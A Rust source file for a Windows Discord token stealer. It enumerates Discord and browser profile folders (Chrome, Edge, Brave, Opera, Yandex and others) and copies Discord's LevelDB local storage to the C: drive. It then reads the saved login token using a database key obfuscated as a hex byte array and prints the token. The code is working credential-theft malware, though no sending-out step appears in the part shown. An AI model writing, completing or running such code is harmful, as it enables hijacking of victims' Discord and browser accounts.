use fs_extra::dir::CopyOptions;
use rusty_leveldb::{DBIterator, LdbIterator, Options, DB};
use std::{env, path::Path};
use sysinfo::{System, SystemExt};

#[derive(Debug, Clone)]
pub struct SystemDetails {
    pub platform: String,
    pub kernel_version: String,
    pub os_version: String,
    pub hostname: String,
}

pub fn get_system_details() -> SystemDetails {
    let mut sys = System::new_all();

    sys.refresh_all();

    SystemDetails {
        platform: sys.name().unwrap(),
        kernel_version: sys.kernel_version().unwrap(),
        os_version: sys.os_version().unwrap(),
        hostname: sys.host_name().unwrap(),
    }
}

pub fn hunt_for_directories(system_details: SystemDetails) -> Vec<String> {
    let mut directories: Vec<String> = Vec::new();

    if system_details.platform == "Windows" {
        let mut dirs_to_check: Vec<String> = Vec::new();

        let userprofile = env::var("USERPROFILE").unwrap();

        // Search for Discord files
        dirs_to_check.push(format!("{}\\AppData\\Roaming\\discord", userprofile));

        dirs_to_check.push(format!("{}\\AppData\\Roaming\\discordcanary", userprofile));

        dirs_to_check.push(format!("{}\\AppData\\Roaming\\discordptb", userprofile));

        // Search Browser Data
        dirs_to_check.push(format!(
            "{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default",
            userprofile
        ));

        dirs_to_check.push(format!(
            "{}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default",
            userprofile
        ));

        dirs_to_check.push(format!(
            "{}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            userprofile
        ));

        dirs_to_check.push(format!(
            "{}\\AppData\\Local\\Chromium\\User Data\\Default",
            userprofile
        ));

        dirs_to_check.push(format!(
            "{}\\AppData\\Local\\Opera Software\\Opera Stable",
            userprofile
        ));

        dirs_to_check.push(format!(
            "{}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default",
            userprofile
        ));

        for dir in dirs_to_check {
            if Path::new(&dir).exists() {
                directories.push(dir);
            }
        }
    }

    directories
}

pub fn discord_token_hunter(dir: String) {
    let userprofile = env::var("USERPROFILE").unwrap();

    let path_str = format!("{}/Local Storage/leveldb", dir);
    let path = Path::new(&path_str);
    let temp_path = Path::new("C:");

    let payloadkeybuf = &[
        0x5fu8, 0x68u8, 0x74u8, 0x74u8, 0x70u8, 0x73u8, 0x3au8, 0x2fu8, 0x2fu8, 0x64u8, 0x69u8,
        0x73u8, 0x63u8, 0x6fu8, 0x72u8, 0x64u8, 0x2eu8, 0x63u8, 0x6fu8, 0x6du8, 0x00u8, 0x01u8,
        0x74u8, 0x6fu8, 0x6bu8, 0x65u8, 0x6eu8,
    ];

    // Copy the leveldb database to a temporary directory
    let options = CopyOptions::new();
    fs_extra::dir::copy(&path, &temp_path, &options);

    let path = Path::new("C:\\leveldb");

    let opt = Options::default();
    let mut db = match DB::open(path, opt) {
        Ok(db) => db,
        Err(e) => panic!("Error opening database: {}", e),
    };

    let token = db.get(payloadkeybuf).unwrap();

    println!("{:?}", String::from_utf8(token));
}
